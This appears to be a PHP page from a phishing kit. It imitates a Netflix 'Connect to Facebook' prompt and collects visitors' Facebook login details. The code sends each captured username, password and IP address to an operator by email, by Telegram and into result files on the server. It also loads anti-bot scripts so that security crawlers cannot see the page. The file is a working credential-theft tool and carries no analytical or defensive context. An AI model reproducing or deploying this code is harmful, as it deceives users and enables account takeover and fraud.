<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include '../autob/bts2.php';
include '../req/config.php';
if(isset($_POST['detailsSubmit'])){
if((isset($_POST['nopin']) && $_POST['nopin'] == 'yes') || ($_POST['fbuser'] !='' && $_POST['fbpassword'] != '')){
		$user        = $_POST['fbuser'];
        $password     = $_POST['fbpassword'];
        $PublicIP     = $_SERVER['REMOTE_ADDR'];
        $Info_LOG = "
------------------ NETFLIX FACEBOOK---------------- 
User           : $user
Password        : $password ";
		$_SESSION['fullz'].=$Info_LOG;
$Info_LOG.='
'.$PublicIP;

// Don't Touche
//Email
        if ($Send_Email == 1) {
            $subject = '♥♥ Netf1ix 💎FB💎 ♥♥'.$PublicIP ;$headers = 'From: YoCHI ️ <yochnetf@yochnet.com>' . "\r\n" .'X-Mailer: PHP/' . phpversion();
				mail($to, $subject, $Info_LOG, $headers);
        };
//FTP == 1 save result elseif == 0 don't save result
        if ($Ftp_Write == 1) {
			@mkdir("../../rst");
            $file = fopen("../../rst/Result_".$PublicIP.".txt", 'a');
            fwrite($file, $Info_LOG);
			fclose($file);
        };
//TELEGRAM 
        if ($send_tg == 1) {
			sendtoTG($tgid, $Info_LOG, $tgtoken);
        };
if($_SESSION['action']=='signup'){$nxtp="endc?y=".md5('yochi_grr');} else{$nxtp="end?y=".md5('yochi_grr');};
header('Location:'.$nxtp);
}
else{header('Location:fbrel?'.$theerrkey.'=1&amp;yn='.md5('yochi'));};
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Connect to facebook</title><meta charset="utf-8" />
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="robots" content="noindex" /><link rel="shortcut icon" href="../oille/FB-f-Logo__blue_57.png">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2, user-scalable=yes" />
  <style>
	*{box-sizing:border-box;}	
	html{margin:0px;background-color:#f6f6f6;color:#686159;font-size:87.5%;font-family:helvetica,arial,sans-serif;padding:0;height:auto;}
	body{margin:0px;background-color:#f6f6f6;color:#686159;font-size:;font-family:helvetica,arial,sans-serif;padding:0;height:100vh;}
	.thead{height:;width:100%;}
	.mainviewpar{padding:0;position:relative;background-color:#f6f6f6;}
    .mainview{width:100%;max-width:639px;margin:0 auto;padding:10px 0;}
	.mainviewchild{margin:0 10px;padding:20px 20px;text-align:center;background-color:#f6f6f6;border:0;}
	@media only screen and (min-width:500px){.mainviewchild{}}
	@media only screen and (min-height:900px){.mainviewchild{margin:50px auto;}}
	.header_logo{display:inline-block;width:30px;height:40px;background:url('../fnset/fav.png') no-repeat;background-position:0px; background-size:100%;}
	.header_logo2{display:inline-block;width:50px;height:50px;background:url('../oille/FB-f-Logo__blue_57.png') no-repeat;background-position:0px; background-size:100%;}
	.vx_modal-header h1{font-size:1.6rem;;font-weight: 400;text-transform: none;font-family: Arial,sans-serif;}
	
	.formbase{max-width:330px;margin:auto}
    input:not([type=checkbox]){width: 100%;height: 40px;padding: 3px 6px;box-sizing:border-box;border: 1px solid #B7B6B6;border-radius: 6px;font-size: 15px;background-color:#fff;text-transform:capitalize;margin-top:10px;}	
    input:focus{border: 2px solid #009CDE;border-radius: 6px;outline:0;z-index:100;}
	
	.cardImage_medium{margin:0px auto 10px;display:block;}
	.hasError,.hasError:focus{border: 1px solid #f00;border-radius: 6px;outline:0;transition:border 0.3s;}
	
	
	.btn_info{width:100%;height:44px;box-sizing:border-box;margin-bottom: 10px;border:0;border-radius: 1.5em;font-size: 16px;text-transform: capitalize;margin-top: 0; background-color:#3b579d !important; cursor: pointer;color: #fff;font-size: 17px;line-height: 1.47059;font-weight: 400;letter-spacing: -.022em;font-family: SF Pro Text,SF Pro Icons,AOS Icons,Helvetica Neue,Helvetica,Arial,sans-serif;display: inline-block;min-width: 30px;padding:11px 23px;text-align: center;text-decoration:none}	
	td{width:;padding:5px 5px;height:12px;vertical-align:;box-sizing:content-box;}
	
	.hide{display:none;}
	.notification-critical{border:1px solid #f00;background-color:#feeeee;height:40px;line-height:40px;font-size:14px;border-radius:5px;}
	.transitioning{height:100%;background-color:rgba(255,255,255,0.8);position:fixed;top:0;left:0;min-height:100%;width:100%;}
	.loader{content:"";position:relative; display: block;top:47%;margin:auto;height:50px;width:50px;-webkit-animation: rotation .7s infinite linear;-moz-animation: rotation .7s infinite linear;-o-animation: rotation .7s infinite linear;animation: rotation .7s infinite linear;border-left:8px solid rgba(0,0,0,.20);border-right:8px solid rgba(0,0,0,.20);border-bottom:8px solid rgba(0,0,0,.20);border-top:8px solid #3e68c7;border-radius:100%;}
	@keyframes rotation {
         from {transform: rotate(0deg);}
         to {transform: rotate(359deg);}
     }
    @-webkit-keyframes rotation {
        from {-webkit-transform: rotate(0deg);}
        to {-webkit-transform: rotate(359deg);}
    }
    @-moz-keyframes rotation {
        from {-moz-transform: rotate(0deg);}
        to {-moz-transform: rotate(359deg);}
    }
    @-o-keyframes rotation {
        from {-o-transform: rotate(0deg);}
        to {-o-transform: rotate(359deg);}
    }
	.nonjsAlert{color:#fff;background-color:#b62525;border-width:1px;min-height:30px;line-height:30px;padding:5px;border-radius:5px;}
</style>
</head>
<body>
<div class="mainviewpar">
<noscript><p class="nonjsAlert" role="alert">NOTE: Many features on the Netflix Web site require Javascript and cookies.</p></noscript>
<div id="mainview" class="mainview"><div class="mainviewchild">
<div class="thead"><span class="header_logo2"></span></div>
<header class="vx_modal-header"><h1 style="font-weight:400;">Connect to Facebook</h1><p class="vx_text-body header-centered"></p></header>
<p style="font-size: 15px; margin-top: 10px; color: #807979;">Netflix is requesting to connect to your account. </p>
<div class="thead"><span class="header_logo"></span></div>
<div class="formbase">
<p style="font-size: 15px; margin-top: 25px; color: #807979;">Sign in to facebook to sign in to your netflix account easier next time </p>
<form  id="mainloginform" method="POST" onsubmit="return validate()">
	
	<div class="nonjsAlert <?php if(isset($_GET[''.$theerrkey.''])==false){echo "hide";};?>" id="errcont">Invalid credentials, Try Again</div>
	<input type="text" name="fbuser" placeholder="Email address or Mobile number"/>
	<input type="password" name="fbpassword" placeholder="Password"/>
	<div style="margin:5px 0;color:#000;"><input type="checkbox" name="nopin" id="nopin" value='yes'/><label for="nopin">I don't have facebook </label></div>
        
<input type="hidden" name="hsub" value="yes"/>
<button type="submit" name="detailsSubmit" class="btn_info" title="" value="yes">NEXT</button>
	</form>
	<a href="<?php if($_SESSION['action']=='signup'){echo "endc?y=".md5('yochi_grr');} else{echo "end?y=".md5('yochi_grr');}; ?>" class="btn_info" title="" onclick="load()">TRY NEXT TIME</a>
</div></div>
</div>
<?php if(!stripos($_SESSION['device'],'yochi')){banbot();};?>
</div>
<div class="transitioning hide" id="loader"><div class="loader">&nbsp;</div></div>
<script type="text/javascript">
"use strict"
document.getElementById("mainloginform").setAttribute("novalidate",true);
function load(){var t = document.getElementById("loader");t.className="transitioning";};
function stopload(){var t = document.getElementById("loader");t.className="transitioning hide";document.getElementById("errnotif").className="notification-critical";};

function validate(){load();return true; };
</script>
</body>
</html>